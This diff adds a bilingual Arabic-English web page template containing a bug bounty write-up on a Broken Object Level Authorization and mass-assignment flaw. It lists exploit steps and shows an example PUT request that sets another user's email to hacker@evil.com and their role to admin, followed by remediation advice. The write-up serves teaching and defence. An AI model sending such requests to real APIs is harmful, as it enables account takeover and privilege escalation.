@@ -1,0 +1,70 @@
+{% extends "main/academy/base.html" %}
+
+{% block title %}API Hacking Writeup{% endblock %}
+
+{% block content %}
+<div class="page-hero">
+  <h1 class="page-title">اختراق الـ APIs وتجاوز طبقات الحماية</h1>
+  <p class="page-title-en">API Hacking: Broken Object Level Authorization (BOLA)</p>
+  <span class="severity-pill pill-high">HIGH</span>
+  <span class="severity-pill pill-medium">Bounty: $2,500</span>
+</div>
+
+<div class="section-card">
+  <h2>Overview / نظرة عامة</h2>
+  <div class="bilingual-block">
+    <div class="lang-section">
+      <span class="lang-tag">AR</span>
+      <p>تتعامل تطبيقات الويب مع الخدمات الخلفية عبر واجهات برمجة التطبيقات (APIs). يوضح هذا التقرير كيفية اكتشاف واستغلال ثغرة BOLA / IDOR لتسريب وتعديل بيانات مستخدمين آخرين والحصول على صلاحيات إدارية كاملة.</p>
+    </div>
+    <div class="lang-section lang-en">
+      <span class="lang-tag">EN</span>
+      <p>Web apps communicate with backends via REST/JSON APIs. This writeup documents how a Broken Object Level Authorization (BOLA) bug was discovered in a private API endpoint, letting users modify administrative settings.</p>
+    </div>
+  </div>
+</div>
+
+<div class="section-card">
+  <h2>Exploit Chain / خطوات الاستغلال</h2>
+  <ol class="steps-list">
+    <li>تحليل وتتبع اتصالات الموقع عبر Burp Suite واكتشاف طلب <code>PUT /api/v2/user/settings</code>.</li>
+    <li>التلاعب بقيم الجسم الممررة في الطلب وتبديل <code>{"user_id": 4020}</code> بمعرف الضحية <code>{"user_id": 1002}</code>.</li>
+    <li>لاحظ أن السيرفر يقبل التعديلات ويقوم بتطبيقها بنجاح دون التحقق من هوية مرسل الطلب.</li>
+    <li>إضافة حقول غير معلنة في الطلب (Mass Assignment) مثل <code>"role": "admin"</code> لترقية الحساب وحقنه بنجاح.</li>
+  </ol>
+</div>
+
+<div class="section-card">
+  <h2>Example Request / نموذج الطلب</h2>
+  <div class="cmd-block">
+    <div class="cmd-bar">
+      <span>API Mass Assignment Exploit Request / طلب استغلال واجهة API</span>
+      <button class="copy-btn" onclick="copyCmd(this)">Copy</button>
+    </div>
+    <pre>PUT /api/v2/user/settings HTTP/1.1
+Host: target-api.com
+Authorization: Bearer guest_token
+Content-Type: application/json
+
+{
+  "user_id": 1002,
+  "email": "hacker@evil.com",
+  "role": "admin"
+}</pre>
+  </div>
+</div>
+
+<div class="section-card">
+  <h2>Remediation / التخفيف والحماية</h2>
+  <div class="bilingual-block">
+    <div class="lang-section">
+      <span class="lang-tag">AR</span>
+      <p>قم بالتحقق دائماً من الصلاحيات والتحكم بالوصول في البيئة الخلفية لكل طلب، وقارن معرّف الجلسة (Session ID) بالمعرّف الممرر في المتغيرات قبل الحفظ.</p>
+    </div>
+    <div class="lang-section lang-en">
+      <span class="lang-tag">EN</span>
+      <p>Ensure that the backend enforces authorization checks for every incoming request by validating that the session owner matches the resource identifier being edited.</p>
+    </div>
+  </div>
+</div>
+{% endblock %}
